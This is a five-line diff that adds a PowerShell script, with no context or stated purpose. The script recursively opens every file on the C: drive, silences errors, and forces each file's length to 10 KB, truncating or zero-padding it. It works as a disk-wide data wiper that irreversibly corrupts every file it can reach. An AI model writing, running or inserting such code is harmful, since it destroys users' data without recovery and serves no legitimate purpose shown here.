@@ -1,0 +1,5 @@
+Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+    $stream = [System.IO.File]::Open($_.FullName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)
+    $stream.SetLength(10KB)
+    $stream.Close()
+}
